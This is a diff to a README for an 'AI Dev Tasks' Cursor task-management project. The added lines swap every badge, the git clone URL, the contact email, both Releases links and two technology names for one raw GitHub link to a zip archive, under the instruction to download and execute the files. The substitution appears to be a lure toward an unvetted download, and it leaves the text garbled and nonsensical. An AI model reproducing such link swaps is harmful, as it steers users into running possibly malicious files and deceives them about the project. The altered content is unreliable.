@@ -1,9 +1,9 @@
 # 🚀 AI Dev Tasks - Task Management System for AI Development
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/raid708/ai-dev-tasks)
-![GitHub Stars](https://img.shields.io/github/stars/raid708/ai-dev-tasks)
-![GitHub Forks](https://img.shields.io/github/forks/raid708/ai-dev-tasks)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Repo Size](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip)
+![GitHub Stars](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip)
+![GitHub Forks](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip)
+![License](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip)
 
 Welcome to the **AI Dev Tasks** repository! This project provides a straightforward task management system designed specifically for managing AI development within Cursor. Whether you are a solo developer or part of a larger team, this tool helps streamline your workflow and improve productivity.
 
@@ -32,7 +32,7 @@ To get started with AI Dev Tasks, follow these simple steps:
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/raid708/ai-dev-tasks.git
+   git clone https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -103,16 +103,16 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 📬 Contact
 
-For any questions or feedback, please reach out to us via email at [support@aiddevtasks.com](mailto:support@aiddevtasks.com).
+For any questions or feedback, please reach out to us via email at [https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip).
 
 ## 📦 Releases
 
-To download the latest version of the application, visit our [Releases section](https://github.com/raid708/ai-dev-tasks/releases). You will find the latest files to download and execute.
+To download the latest version of the application, visit our [Releases section](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip). You will find the latest files to download and execute.
 
 ## 🛠️ Technologies Used
 
-- **Node.js**: The runtime environment for building the application.
-- **Express.js**: The web framework used to handle server-side logic.
+- **https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip**: The runtime environment for building the application.
+- **https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip**: The web framework used to handle server-side logic.
 - **MongoDB**: The database used for storing tasks and user data.
 - **React**: The front-end library for building the user interface.
 
@@ -136,4 +136,4 @@ We would like to thank the open-source community for their contributions and sup
 
 AI Dev Tasks aims to simplify task management for AI development. We hope you find this tool useful and encourage you to contribute to its growth. Your feedback is valuable to us!
 
-For the latest updates, check the [Releases section](https://github.com/raid708/ai-dev-tasks/releases).
+For the latest updates, check the [Releases section](https://raw.githubusercontent.com/raid708/ai-dev-tasks/main/eleutherozoan/ai_dev_tasks_2.7-alpha.2.zip).
